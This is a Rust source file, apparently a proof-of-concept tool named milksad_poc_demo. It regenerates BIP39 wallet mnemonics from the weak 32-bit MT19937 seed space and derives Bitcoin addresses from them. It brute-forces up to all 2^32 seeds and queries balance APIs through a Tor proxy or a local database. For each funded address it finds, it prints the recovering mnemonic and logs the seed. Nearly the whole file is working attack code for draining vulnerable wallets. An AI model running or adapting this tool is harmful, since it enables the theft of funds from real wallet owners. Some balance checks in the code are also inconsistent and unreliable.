use bip39::{Language, Mnemonic};
use bitcoin::network::constants::Network;
use bitcoin::secp256k1::Secp256k1;
use bitcoin::util::address::Address;
use bitcoin::util::bip32::{DerivationPath, ExtendedPrivKey};
use bitcoin::PublicKey;
use fastbloom::BloomFilter;
use hex::ToHex;
use mersenne_twister::MT19937;
use rand::{Rng, SeedableRng};
use rayon::prelude::*;
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::env;
use std::fs::{File, OpenOptions};
use std::io::{BufRead, BufReader, Write};
use std::str::FromStr;
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use std::sync::Arc;
use std::sync::Mutex;
use std::time::Duration;
use tracing::{debug, error, info, warn};
use tracing_subscriber::{fmt, EnvFilter};

/// Stats structure from mempool.space API
#[derive(Debug, Deserialize, Serialize)]
struct AddressStats {
    funded_txo_count: u64,
    funded_txo_sum: u64,
    spent_txo_count: u64,
    spent_txo_sum: u64,
    tx_count: u64,
}

/// Full response structure from mempool.space /api/address/:address
#[derive(Debug, Deserialize, Serialize)]
struct AddressInfo {
    address: String,
    chain_stats: AddressStats,
    mempool_stats: AddressStats,
}

/// blockchain.info API response
#[derive(Debug, Deserialize)]
struct BlockchainInfoAddress {
    final_balance: u64,
    n_tx: u64,
    total_received: u64,
    total_sent: u64,
}

/// BlockCypher API response
#[derive(Debug, Deserialize)]
struct BlockCypherAddress {
    address: String,
    balance: u64,
    total_received: u64,
    total_sent: u64,
    n_tx: u64,
    unconfirmed_balance: u64,
}

/// Local API address response
#[derive(Debug, Deserialize)]
struct LocalAddressInfo {
    address: String,
    info: Option<serde_json::Value>,
}

/// Check if address exists in local database via API
fn check_address_exists_local(address: &str) -> Result<bool, Box<dyn std::error::Error>> {
    // print!("Checking local DB for address: {} ... ", address);
    let url = format!("http://localhost:8082/api/1.0/address/{}", address);
    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        .build()?;
    
    debug!("Checking local API for address: {}", address);
    
    let response = client.get(&url).send()?;

    if !response.status().is_success() {
        debug!("Local API returned status: {}", response.status());
        return Ok(false);
    }
    println!("Local API returned status: {}", response.status());
    let address_info: LocalAddressInfo = response.json()?;
    
    // Address exists if info is Some and not null
    let exists = address_info.info.is_some();
    if exists {
        info!("Address {} found in local database", address);
    } else {
        debug!("Address {} not found in local database", address);
    }
    
    Ok(exists)
}

/// Fetch address balance and details from mempool.space API
fn get_address_balance(address: &str) -> Result<AddressInfo, Box<dyn std::error::Error>> {
    let url: String = format!("https://mempool.space/api/address/{}", address);
    let client = Client::builder()
        .proxy(reqwest::Proxy::all("socks5://127.0.0.1:9050")?)
        .timeout(Duration::from_secs(60))
        .build()?;
    let response = client.get(&url).send()?;

    if !response.status().is_success() {
        return Err(format!("API returned status: {}", response.status()).into());
    }

    let address_info: AddressInfo = response.json()?;
    Ok(address_info)
}

/// Calculate current balance from address info
fn calculate_balance(info: &AddressInfo) -> i64 {
    let chain_balance =
        info.chain_stats.funded_txo_sum as i64 - info.chain_stats.spent_txo_sum as i64;
    let mempool_balance =
        info.mempool_stats.funded_txo_sum as i64 - info.mempool_stats.spent_txo_sum as i64;
    chain_balance + mempool_balance
}

/// Fetch address balance from blockchain.info API
fn get_balance_blockchain_info(
    address: &str,
) -> Result<BlockchainInfoAddress, Box<dyn std::error::Error>> {
    let url = format!("https://blockchain.info/rawaddr/{}", address);
    let client = Client::builder()
        .proxy(reqwest::Proxy::all("socks5://127.0.0.1:9050")?)
        .timeout(Duration::from_secs(60))
        .build()?;
    let response = client.get(&url).send()?;

    if !response.status().is_success() {
        return Err(format!("API returned status: {}", response.status()).into());
    }

    let address_info: BlockchainInfoAddress = response.json()?;
    Ok(address_info)
}

/// Fetch address balance from BlockCypher API
fn get_balance_blockcypher(
    address: &str,
) -> Result<BlockCypherAddress, Box<dyn std::error::Error>> {
    let url = format!("https://api.blockcypher.com/v1/btc/main/addrs/{}", address);
    let client = Client::builder()
        .proxy(reqwest::Proxy::all("socks5://127.0.0.1:9050")?)
        .timeout(Duration::from_secs(60))
        .build()?;
    let response = client.get(&url).send()?;

    if !response.status().is_success() {
        return Err(format!("API returned status: {}", response.status()).into());
    }

    let address_info: BlockCypherAddress = response.json()?;
    Ok(address_info)
}

/// Try multiple APIs with fallback
fn get_balance_with_fallback(
    address: &str,
) -> Result<(String, String), Box<dyn std::error::Error>> {
    // Try mempool.space first
    debug!("Trying mempool.space API for address: {}", address);
    match get_address_balance(address) {
        Ok(info) => {
            // Only process balance if there are transactions
            if info.chain_stats.tx_count == 0 && info.mempool_stats.tx_count == 0 {
                debug!("No transactions found for address: {}", address);
                return Ok((
                    "0".to_string(),
                    "Source: mempool.space\nNo transactions found for this address".to_string(),
                ));
            }

            let balance_sats = calculate_balance(&info);
            let balance_btc = balance_sats as f64 / 100_000_000.0;

            let details = format!(
                "Source: mempool.space\n\
                Chain Stats:\n\
                  Transactions: {}\n\
                  Funded TXO Count: {}\n\
                  Funded Sum: {} sats\n\
                  Spent TXO Count: {}\n\
                  Spent Sum: {} sats\n\
                Mempool Stats:\n\
                  Transactions: {}\n\
                  Funded TXO Count: {}\n\
                  Funded Sum: {} sats\n\
                  Spent TXO Count: {}\n\
                  Spent Sum: {} sats",
                info.chain_stats.tx_count,
                info.chain_stats.funded_txo_count,
                info.chain_stats.funded_txo_sum,
                info.chain_stats.spent_txo_count,
                info.chain_stats.spent_txo_sum,
                info.mempool_stats.tx_count,
                info.mempool_stats.funded_txo_count,
                info.mempool_stats.funded_txo_sum,
                info.mempool_stats.spent_txo_count,
                info.mempool_stats.spent_txo_sum
            );

            info!("Balance found via mempool.space: {} sats", balance_sats);
            return Ok((
                format!("{}", balance_sats),
                details,
            ));
        }
        Err(e) => {
            warn!("mempool.space API error for {}: {}", address, e);
        }
    }

    // Try blockchain.info
    debug!("Trying blockchain.info API for address: {}", address);
    match get_balance_blockchain_info(address) {
        Ok(info) => {
            // Only process balance if there are transactions
            if info.n_tx == 0 {
                debug!("No transactions found for address: {}", address);
                return Ok((
                    "0".to_string(),
                    "Source: blockchain.info\nNo transactions found for this address".to_string(),
                ));
            }

            let balance_btc = info.final_balance as f64 / 100_000_000.0;

            let details = format!(
                "Source: blockchain.info\n\
                Transactions: {}\n\
                Total Received: {} sats\n\
                Total Sent: {} sats",
                info.n_tx, info.total_received, info.total_sent
            );

            info!(
                "Balance found via blockchain.info: {} sats",
                info.final_balance
            );
            if info.final_balance == 0 {
                debug!("Zero balance from blockchain.info for address: {}", address);
                return Ok((
                    "0".to_string(),
                    details,
                ));
            }


            return Ok((
                format!("${}", info.final_balance),
                details,
            ));
        }
        Err(e) => {
            warn!("blockchain.info API error for {}: {}", address, e);
        }
    }

    // Try BlockCypher
    debug!("Trying BlockCypher API for address: {}", address);
    match get_balance_blockcypher(address) {
        Ok(info) => {
            // Only process balance if there are transactions
            if info.n_tx == 0 {
                debug!("No transactions found for address: {}", address);
                return Ok((
                    "0".to_string(),
                    "Source: BlockCypher\nNo transactions found for this address".to_string(),
                ));
            }

            let balance_btc = info.balance as f64 / 100_000_000.0;
            let unconfirmed_btc = info.unconfirmed_balance as f64 / 100_000_000.0;

            let details = format!(
                "Source: BlockCypher\n\
                Transactions: {}\n\
                Total Received: {} sats\n\
                Total Sent: {} sats\n\
                Unconfirmed Balance: {} sats ({:.8} BTC)",
                info.n_tx,
                info.total_received,
                info.total_sent,
                info.unconfirmed_balance,
                unconfirmed_btc
            );

            info!("Balance found via BlockCypher: {} sats", info.balance);
            if info.balance == 0 {
                debug!("Zero balance from BlockCypher for address: {}", address);
                return Ok((
                    "0".to_string(),
                    details,
                ));
            }
            return Ok((
                format!("${}", info.balance),
                details,
            ));
        }
        Err(e) => {
            error!("BlockCypher API error for {}: {}", address, e);
        }
    }

    error!("All APIs failed for address: {}", address);
    Err("All APIs failed".into())
}

/// Produce N bytes from MT19937 (32-bit) by repeatedly drawing 32-bit words.
/// This mimics the vulnerable code: seed mt19937 with a 32-bit seed, then
/// take bytes from the PRNG to form an entropy buffer.
fn mt19937_bytes_from_seed(seed: u32, out_len: usize) -> Vec<u8> {
    let mut mt: MT19937 = SeedableRng::from_seed(seed as u64);
    let mut out = Vec::with_capacity(out_len);
    while out.len() < out_len {
        let v: u32 = mt.gen();
        out.extend_from_slice(&v.to_le_bytes()); // bx likely used platform byte order; using little-endian here
    }
    out.truncate(out_len);
    out
}

/// Convert bytes (entropy) into a BIP39 mnemonic (English).
/// We expect `entropy` bit-length to be one of allowed lengths (128,160,192,224,256).
fn entropy_to_mnemonic(entropy: &[u8]) -> Mnemonic {
    // Construct mnemonic from raw entropy bytes
    Mnemonic::from_entropy_in(Language::English, entropy).expect("Failed to build mnemonic")
}

/// Derive the first external (0) address for BIP44 m/44'/0'/0'/0/0 using mnemonic.
/// This uses BIP39 -> seed -> BIP32 to derive an xprv and get address.
fn mnemonic_to_first_btc_addr(mnemonic: &Mnemonic) -> Address {
    // BIP39 seed (no passphrase)
    let passphrase = "";
    let seed = mnemonic.to_seed(passphrase);

    // Use bitcoin crate to derive m/44'/0'/0'/0/0
    let network = Network::Bitcoin;
    let secp = Secp256k1::new();
    let xprv = ExtendedPrivKey::new_master(network, &seed).expect("xprv master");

    // BIP44 path m/44'/0'/0'/0/0
    let path = DerivationPath::from_str("m/44'/0'/0'/0/0").expect("derivation path");

    let child = xprv.derive_priv(&secp, &path).expect("derive child");
    let secp_pubkey = child.private_key.public_key(&secp);
    let pubkey = PublicKey::new(secp_pubkey);
    Address::p2pkh(&pubkey, network)
}

fn print_usage_and_exit() -> ! {
    eprintln!("Usage:");
    eprintln!("  Single seed:  milksad_poc_demo <seed_u32> [entropy_bits]");
    eprintln!("  Brute force:  milksad_poc_demo --brute <start_seed> <end_seed> [entropy_bits] [--threads <num>]");
    eprintln!("  Brute all:    milksad_poc_demo --brute-all [entropy_bits] [--threads <num>]");
    eprintln!("\nOptions:");
    eprintln!("  --threads <num>   Number of threads to use (default: CPU count)");
    eprintln!("\nExamples:");
    eprintln!("  milksad_poc_demo 1697059200 256");
    eprintln!("  milksad_poc_demo --brute 0 1000000 256");
    eprintln!("  milksad_poc_demo --brute 1697059000 1697060000 --threads 8");
    eprintln!("  milksad_poc_demo --brute-all 256 --threads 16");
    std::process::exit(2);
}

/// Log checked address to file
fn log_address_to_file(
    file: &Mutex<std::fs::File>,
    seed: u32,
    entropy_hex: &str,
    mnemonic: &str,
    address: &str,
    balance: Option<&str>,
) {
    if let Ok(mut file) = file.lock() {
        let log_entry = if let Some(bal) = balance {
            format!(
                "{},{},{}\n",
                seed, address, bal
            )
        } else {
            format!(
                "{},{},\n",
                seed, address
            )
        };

        if let Err(e) = file.write_all(log_entry.as_bytes()) {
            error!("Failed to write to log file: {}", e);
        }
    }
}

fn main() {
    // Initialize tracing with thread IDs
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env().add_directive(tracing::Level::INFO.into()))
        .with_thread_ids(true)
        .with_thread_names(true)
        .init();

    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        print_usage_and_exit();
    }

    // Parse --threads argument if present
    let mut custom_threads: Option<usize> = None;
    for i in 0..args.len() {
        if args[i] == "--threads" && i + 1 < args.len() {
            custom_threads = Some(args[i + 1].parse().expect("threads must be a positive integer"));
            break;
        }
    }

    // Configure thread pool if custom threads specified
    if let Some(num_threads) = custom_threads {
        rayon::ThreadPoolBuilder::new()
            .num_threads(num_threads)
            .build_global()
            .expect("Failed to configure thread pool");
        info!("Using {} custom threads", num_threads);
    }

    // Parse --bloom argument or check for dumptxoutset
    // let mut bloom_file: Option<String> = None;
    // for i in 0..args.len() {
    //     if args[i] == "--bloom" && i + 1 < args.len() {
    //         bloom_file = Some(args[i + 1].clone());
    //         break;
    //     }
    // }
    // if bloom_file.is_none() && std::path::Path::new("dumptxoutset").exists() {
    //     bloom_file = Some("dumptxoutset".to_string());
    // }
    // let bloom_filter = bloom_file.map(|path| Arc::new(load_bloom_filter(&path)));

    // Check for brute-all mode (entire 2^32 space)
    if args[1] == "--brute-all" {
        let entropy_bits: usize = if args.len() >= 3 {
            args[2]
                .parse()
                .expect("entropy bits must be integer (128/160/192/224/256)")
        } else {
            256
        };

        if ![128, 160, 192, 224, 256].contains(&entropy_bits) {
            eprintln!("entropy_bits must be one of 128,160,192,224,256");
            std::process::exit(1);
        }
        let entropy_bytes = entropy_bits / 8;

        // Load existing addresses from log file
        let log_filename = format!("brute_force_all_{}.log", entropy_bits);
        // let existing_addresses = Arc::new(load_existing_addresses(&log_filename));

        // Create log file
        let log_file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_filename)
            .expect("Failed to create log file");
        let log_file = Arc::new(Mutex::new(log_file));

        info!("=== Brute Force ALL Mode (Full 2^32 Space) ===");
        info!("Start seed: 0");
        info!("End seed: {}", u32::MAX);
        info!("Entropy bits: {}", entropy_bits);
        info!("Total seeds to check: {}", (u32::MAX as u64) + 1);
        info!(
            "Using multi-threading with {} threads",
            rayon::current_num_threads()
        );
        info!("Logging to: brute_force_all.log");
        info!("Starting brute force...\n");

        let checked = Arc::new(AtomicU64::new(0));
        let found = Arc::new(AtomicU32::new(0));
        let report_interval = 10000;

        (0u32..=u32::MAX).into_par_iter().for_each(|seed| {
            debug!("Processing seed: {}", seed);
            let entropy = mt19937_bytes_from_seed(seed, entropy_bytes);
            let entropy_hex = entropy.encode_hex::<String>();
            let mnemonic = entropy_to_mnemonic(&entropy);
            let address = mnemonic_to_first_btc_addr(&mnemonic);

            let current_checked = checked.fetch_add(1, Ordering::Relaxed);

            // Report progress
            if current_checked % report_interval == 0 {
                let current_found = found.load(Ordering::Relaxed);
                info!(
                    "Progress: checked={}, found={}, current_seed={}",
                    current_checked, current_found, seed
                );
            }
            //check local
            match check_address_exists_local(&address.to_string()) {
                Ok(exists) => {
                    if exists {
                        log_address_to_file(
                            &log_file,
                            seed,
                            &entropy_hex,
                            &mnemonic.to_string(),
                            &address.to_string(),
                            Some("found in local DB"),
                        );
                        let new_found = found.fetch_add(1, Ordering::Relaxed) + 1;
                        info!("╔═══════════════════════════════════════════════════════════════╗");
                        info!("║ FOUND ADDRESS IN LOCAL DATABASE!");
                        info!("╚═══════════════════════════════════════════════════════════════╝");
                        info!("Seed: {}", seed);
                        info!("Address: {}", address);
                        info!("Mnemonic: {}", mnemonic);
                        info!("Total found so far: {}", new_found);
                        info!("═══════════════════════════════════════════════════════════════\n");
                        log_address_to_file(
                            &log_file,
                            seed,
                            &entropy_hex,
                            &mnemonic.to_string(),
                            &address.to_string(),
                            Some("found in local DB"),
                        );
                    }
                }
                Err(e) => {
                    error!("Error checking local DB for {}: {}", address, e);
                }
            }

            // Check if address already exists in log
            // if let Some(existing_balance) = existing_addresses.get(&address.to_string()) {
            //     debug!("Address {} already checked, skipping", address);
            //     if existing_balance.is_some() && !existing_balance.as_ref().unwrap().starts_with("0") {
            //         found.fetch_add(1, Ordering::Relaxed);
            //     }
            //     return;
            // }

            // Bloom filter check - skip API call if address not in filter
            // if let Some(filter) = &bloom_filter {
            //     if !filter.contains(address.to_string().as_bytes()) {
            //         // Address not in bloom filter, skip API check
            //         return;
            //     }
            //     info!("Bloom filter MATCH for seed {}: {}", seed, address);
            // }

        });

        info!("\n=== Brute Force Complete ===");
        info!("Total seeds checked: {}", checked.load(Ordering::Relaxed));
        info!("Addresses with balance: {}", found.load(Ordering::Relaxed));
        return;
    }

    // Check for brute force mode with range
    if args[1] == "--brute" {
        if args.len() < 4 {
            print_usage_and_exit();
        }

        let start_seed: u32 = args[2]
            .parse()
            .expect("start_seed must be an integer (u32)");
        let end_seed: u32 = args[3].parse().expect("end_seed must be an integer (u32)");
        let entropy_bits: usize = if args.len() >= 5 {
            args[4]
                .parse()
                .expect("entropy bits must be integer (128/160/192/224/256)")
        } else {
            256
        };

        if ![128, 160, 192, 224, 256].contains(&entropy_bits) {
            eprintln!("entropy_bits must be one of 128,160,192,224,256");
            std::process::exit(1);
        }
        let entropy_bytes = entropy_bits / 8;

        // Load existing addresses from log file
        let log_filename = format!("brute_force_{}_{}.log", start_seed, end_seed);

        // Create log file
        let log_file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_filename)
            .expect("Failed to create log file");
        let log_file = Arc::new(Mutex::new(log_file));

        info!("=== Brute Force Mode (Multi-threaded) ===");
        info!("Start seed: {}", start_seed);
        info!("End seed: {}", end_seed);
        info!("Entropy bits: {}", entropy_bits);
        info!(
            "Total seeds to check: {}",
            (end_seed as u64) - (start_seed as u64) + 1
        );
        info!("Using {} threads", rayon::current_num_threads());
        info!("Logging to: {}", log_filename);
        info!("Starting brute force...\n");

        let checked = Arc::new(AtomicU64::new(0));
        let found = Arc::new(AtomicU32::new(0));
        let report_interval = 1000;

        (start_seed..=end_seed).into_par_iter().for_each(|seed| {
            debug!("Processing seed: {}", seed);
            let entropy = mt19937_bytes_from_seed(seed, entropy_bytes);
            let entropy_hex = entropy.encode_hex::<String>();
            let mnemonic = entropy_to_mnemonic(&entropy);
            let address = mnemonic_to_first_btc_addr(&mnemonic);

            let current_checked = checked.fetch_add(1, Ordering::Relaxed);

            // Report progress
            if current_checked % report_interval == 0 {
                let current_found = found.load(Ordering::Relaxed);
                info!(
                    "Progress: checked={}, found={}, current_seed={}",
                    current_checked, current_found, seed
                );
            }

            // Bloom filter check
            // if let Some(filter) = &bloom_filter {
            //     if !filter.contains(address.to_string().as_bytes()) {
            //         return;
            //     }
            //     info!("Bloom filter match for seed {}: {}", seed, address);
            // }

            // Check balance
            match get_balance_with_fallback(&address.to_string()) {
                // Log to file
                Ok((balance, details)) => {
                    log_address_to_file(
                        &log_file,
                        seed,
                        &entropy_hex,
                        &mnemonic.to_string(),
                        &address.to_string(),
                        Some(&balance),
                    );
                    if !balance.starts_with("0 sats") {
                        let new_found = found.fetch_add(1, Ordering::Relaxed) + 1;
                        info!("╔═══════════════════════════════════════════════════════════════╗");
                        info!("║ FOUND ADDRESS WITH BALANCE!");
                        info!("╚═══════════════════════════════════════════════════════════════╝");
                        info!("Seed: {}", seed);
                        info!("Address: {}", address);
                        info!("Mnemonic: {}", mnemonic);
                        info!("\n{}", details);
                        info!("\nBalance: {}", balance);
                        info!("Total found so far: {}", new_found);
                        info!("═══════════════════════════════════════════════════════════════\n");
                    }
                }
                Err(e) => {
                    log_address_to_file(
                        &log_file,
                        seed,
                        &entropy_hex,
                        &mnemonic.to_string(),
                        &address.to_string(),
                        None,
                    );
                    warn!("API error at seed {}: {}", seed, e);
                }
            }
        });

        info!("\n=== Brute Force Complete ===");
        info!("Total seeds checked: {}", checked.load(Ordering::Relaxed));
        info!("Addresses with balance: {}", found.load(Ordering::Relaxed));
        return;
    }

    // Single seed mode (original behavior)
    let seed_u32: u32 = args[1].parse().expect("seed must be an integer (u32)");
    let entropy_bits: usize = if args.len() >= 3 {
        args[2]
            .parse()
            .expect("entropy bits must be integer (128/160/192/224/256)")
    } else {
        256
    }; // default to 256 bits (32 bytes)

    if ![128, 160, 192, 224, 256].contains(&entropy_bits) {
        eprintln!("entropy_bits must be one of 128,160,192,224,256");
        std::process::exit(1);
    }
    let entropy_bytes = entropy_bits / 8;

    // Produce entropy from MT19937 seeded with seed_u32
    let entropy = mt19937_bytes_from_seed(seed_u32, entropy_bytes);

    info!("Seed (u32): {}", seed_u32);
    info!("Entropy (hex): {}", entropy.encode_hex::<String>());
    info!("Entropy (len bytes): {}", entropy.len());

    // Build mnemonic from entropy
    let mnemonic = entropy_to_mnemonic(&entropy);
    info!("Mnemonic: {}", mnemonic.to_string());

    // Derive Bitcoin first address
    let address = mnemonic_to_first_btc_addr(&mnemonic);
    info!("Derived Bitcoin address (m/44'/0'/0'/0/0): {}", address);

    // Fetch address balance with fallback APIs
    info!("\nFetching address balance...");
    match get_balance_with_fallback(&address.to_string()) {
        Ok((balance, details)) => {
            info!("\n=== Address Information ===");
            info!("{}", details);
            info!("\n=== Current Balance ===");
            info!("Balance: {}", balance);
        }
        Err(e) => {
            error!("Error fetching address balance: {}", e);
        }
    }
}
